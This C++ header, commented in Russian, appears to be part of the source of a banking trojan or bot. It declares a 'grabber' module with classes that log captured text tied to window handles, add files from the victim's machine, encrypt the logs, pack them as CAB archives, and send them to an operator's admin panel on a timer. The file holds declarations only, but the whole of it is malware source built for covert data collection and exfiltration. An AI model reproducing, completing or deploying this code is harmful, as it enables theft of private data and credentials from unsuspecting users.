//---------------------------------------------------------------------------
//  Модуль утилит для работы граберов
//---------------------------------------------------------------------------

#ifndef GrabbersH
#define GrabbersH
//---------------------------------------------------------------------------

#include "GetApi.h"
#include "Strings.h"
#include "BotClasses.h"


// сигнатура файла грабера
#define GRABBER_FILE_SIGNATURE 0x87AF1966

// сигнатура блока данных файла грабера
#define GRABBER_FILE_BLOCK_SIGNATURE 0xC7BFB244

// Версия файла грабера
#define GRABBER_FILE_VERSION 1


// Интервал ожидания отправки
#define GRABBER_SEND_INTERVAL 300000 /* Пять минут */

// ьтпы данных граберов
#define GRABBER_DATA_TEXT     100  /* Текстовый блок */
#define GRABBER_DATA_TEXTPART 101  /* Часть текстового блока */
#define GRABBER_DATA_FILE     102  /* Файловый блок */


//-------------------------------------------
//  GetGrabbersPath - Функция возвращет имя
//                рабочего каталога грабера
//-------------------------------------------
string GetGrabbersPath();



class TGrabberFile;
class TGrabberBlock;



//------------------------------------------------------
//  TGrabberFile - Базовый класс для работы с файлом
//                 грабера
//------------------------------------------------------
class TGrabberFile : public TBotObject
{
private:
	TBotCollection* FBlocks; // Коллекция блоков
	string FFileName;     // Имя файла
	string FGrabberName;  // Имя грабера
	PCHAR  FPassword;     // Пароль шифрования
	DWORD  FType;         // Тип файла
	DWORD  FBlocksStart;  // Смещение в файле к началу блоков данных
	bool   FClosed;       // Признак того, что лог зкрыт
	DWORD  FSendInterval; // Интервал времени после которого будет отправлен лог
	bool   FSendAsCAB;    // Признак необходимости отправки лога CAB архива
	DWORD  FPID;          // Идентификатор процеса, который СОЗДАЛ лог
	bool   FIsEmpty;      // Признак того, что лог пустой.  Актуально только после чтения блоков
	TBotFileStream *FStream;

	void   Initialize(const string& GrabberName, const char* FileName, bool AutoActivate);
	bool   UpdateFileHeader(bool WriteName);
	bool   ReadBlocks();
	string DoPackTextData();
	bool   DoPackFilesToCab(LPVOID Cab);


	friend class TGrabberBlock;
protected:
	bool WriteData(LPVOID Data, DWORD Size, bool WriteSize, bool AllocMemForCrypt);
	bool WriteSizedString(const string &Str);

	bool ReadData(LPVOID Buf, DWORD DataSize);
	bool ReadString(DWORD StringSize, string &Str);
	bool ReadSizedString(string &Str);

	TGrabberBlock* GetBlockByName(const string& Name);
public:
	TGrabberFile(const string& GrabberName, const char* FileName, bool AutoActivate);
	TGrabberFile(const string& GrabberName);
	~TGrabberFile();
	bool Activate(bool* Created); // Функция открывает файл грабера. Если его нет, то он будет автоматически создан
	bool Active();   // Функция возвращет истину если в данный момент фал открыт
	bool Create();   // Функция создаёт НОВЫЙ файл грабера
	bool Open();     // Функция открывает СУЩЕСТВУЮЩИЙ файл грабера
    bool CanSend(bool OpenFile); // Функция возвращает истину если файл можно отправить

	void CloseLog();   // Функция закрывает лог.
	void CloseFile();  // Функция закрывает открытый файл
	void DeleteFile(); // Функция закрывает файл и удаляет его

	string PackToCAB(); // Функция запаковывает данные в каб архив

	void SetSendInterval(DWORD Interval); /* миллисекунд */  // Функция задаёт интервал ожидания после поледней записи до отправки лога
	void SetSendAsCAB(bool SendAsCAB); // Функция задаёт необходимость отправки лога CAB архивом

	bool SendLog(bool DeleteLog); // Функция отправляет лог в админку

	bool AddText(const string& Name, const string& Data); // Функция добавляет текстовые данные
	bool AddTextPart(HWND Wnd, const string& Name, const string& Data); // Функция добавляет часть текстовых данных
	bool AddFile(const string& Name, const string& FileName, PCHAR SubDir, PCHAR InternalName); // функция добавляет файл в лог
};


//------------------------------------------------------
//  TGrabberBlock - Блок данных грабера
//------------------------------------------------------
class TGrabberBlock : public TBotCollectionItem
{
private:
	TGrabberFile* FFile;
	string FName;
	string FFileName;
	string FInternalFileName;
	string FTempFileName;
	DWORD  FDataSize;    // Размер данных блока
	HWND   FWND;         // Идентификатор окна, для которого писался текстовый лог
	string FAsString;    // Строковые данные
	LPBYTE FAsBlob;      // Данные в бинарном виде
	DWORD  FDataType;    // Тип данных блока
	bool   FIgnoreBlock; // Данный блок необходимо проигнорировать

	void Initialize();

	bool Write(LPVOID Data, DWORD DataSize, bool AllocMemForCrypt);

	bool Read();
	bool ReadBlockData();
	bool DoReadTextData();
	bool DoReadFileData();

	friend class TGrabberFile;
public:

	TGrabberBlock(TGrabberFile* File);
	~TGrabberBlock();

	void Clear();

	bool WriteText(const string& Name, const string& Data, bool IsTextPart);
	bool WriteFile(const string& Name, const string& FileName, PCHAR SubDir, PCHAR InternalName);
};



//------------------------------------------------------
//  Класс отправки логов
//------------------------------------------------------
class TGrabberFileSender : public TBotObject
{
private:
	string FWorkPath;
	string FMask;
public:
	TGrabberFileSender();
	~TGrabberFileSender();

	void SendFiles();
};

//---------------------------------------------------------------------------
#endif
